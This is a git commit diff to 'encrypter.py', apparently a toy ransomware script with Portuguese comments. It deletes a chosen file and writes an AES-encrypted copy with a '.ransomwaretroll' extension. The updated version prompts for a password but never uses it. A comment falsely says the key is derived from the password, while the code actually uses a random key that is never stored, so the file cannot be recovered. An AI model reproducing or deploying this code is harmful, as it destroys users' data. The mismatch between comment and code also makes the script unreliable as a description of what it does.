600453f7e96cde084d5ec0958548b248856c939f
Paulo Rosa <97402105+prosa41@users.noreply.github.com>
2024-01-14 11:28:12 -0300

    Update encrypter.py

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,35 @@
 import os
 import pyaes
+from getpass import getpass
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
+# Solicitar o nome do arquivo a ser criptografado
+file_name = input("Digite o nome do arquivo a ser criptografado: ")
+if not os.path.exists(file_name):
+    print("Arquivo não encontrado.")
+    exit()
+
+# Abrir o arquivo a ser criptografado
 file = open(file_name, "rb")
 file_data = file.read()
 file.close()
 
-## remover o arquivo
+# Remover o arquivo original
 os.remove(file_name)
 
-## chave de criptografia
-key = b"testeransomwares"
+# Pedir a senha ao usuário
+password = getpass("Digite a senha para criptografar o arquivo: ")
+
+# Chave de criptografia derivada da senha
+key = os.urandom(32)  # Pode ser uma chave mais segura usando bibliotecas como bcrypt
 aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
+# Criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
+# Salvar o arquivo criptografado
+new_file_name = file_name + ".ransomwaretroll"
+new_file = open(new_file_name, 'wb')
 new_file.write(crypto_data)
 new_file.close()
+
+print(f'Arquivo criptografado com sucesso como "{new_file_name}"')
